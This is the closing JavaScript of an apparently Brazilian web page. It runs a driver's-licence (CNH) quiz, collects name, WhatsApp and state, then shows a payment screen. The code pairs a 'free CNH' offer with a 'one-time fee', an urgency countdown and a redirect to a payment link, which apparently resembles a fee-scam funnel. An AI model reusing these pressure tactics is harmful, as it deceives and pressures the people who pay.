nextBtn.addEventListener('click', ()=>{
    if(optionsContainer.classList.contains('answered')){
        if(currentQuestion < totalQuestions - 1){
            currentQuestion++;
            showQuestion(currentQuestion);
        } else {
            // Ao final do quiz, chama a nova tela de transiÃ§Ã£o
            showTransitionScreen(); 
        }
    } else {
        alert("Por favor, selecione uma opÃ§Ã£o antes de prosseguir.");
    }
});

// NOVO: LÃ³gica para a escolha da CNH
categoryButtons.forEach(button => {
    button.addEventListener('click', () => {
        // 1. Limpa a seleÃ§Ã£o em todos
        categoryButtons.forEach(btn => btn.classList.remove('selected'));
        
        // 2. Marca o botÃ£o clicado
        button.classList.add('selected');
        
        // 3. Salva a escolha
        cnhCategory = button.getAttribute('data-category');
        
        // 4. Pausa para o efeito visual e Procede para a prÃ³xima tela (Resultado/PrÃ©-cadastro)
        setTimeout(showResultScreen, 500); 
    });
});


// AÃ‡ÃƒO DO BOTÃƒO 'Garantir Minha CNH Gratuita Agora' (TELA 1)
preCadastroForm.addEventListener('submit', (event) => {
    event.preventDefault(); 
    
    // Coleta dos dados (VocÃª faria o envio real aqui, como para uma planilha/API)
    const nome = document.getElementById('nome').value;
    const whatsapp = document.getElementById('whatsapp').value;
    const estado = document.getElementById('estado').value;

    console.log(`Dados para PrÃ©-cadastro: Nome: ${nome}, WhatsApp: ${whatsapp}, Estado: ${estado}, CNH Escolhida: ${cnhCategory}`);

    if (score >= MIN_SCORE) {
        // Esconde a TELA 1 e mostra a TELA 2 (Pagamento)
        resultScreen.classList.add('hidden');
        paymentScreen.classList.remove('hidden');
        
        // Inicia o cronÃ´metro de urgÃªncia
        startPaymentTimer();
    }
});

// AÃ‡ÃƒO DO BOTÃƒO 'Confirmar o PrÃ©-cadastro e Pagar Taxa Ãšnica...' (TELA 2)
payBtn.addEventListener('click', () => {
    if (!payBtn.disabled) {
        // Redireciona para o link de pagamento
        window.location.href = PAYMENT_LINK;
    }
});


// Inicia o quiz
showQuestion(currentQuestion);
</script>



</body></html>
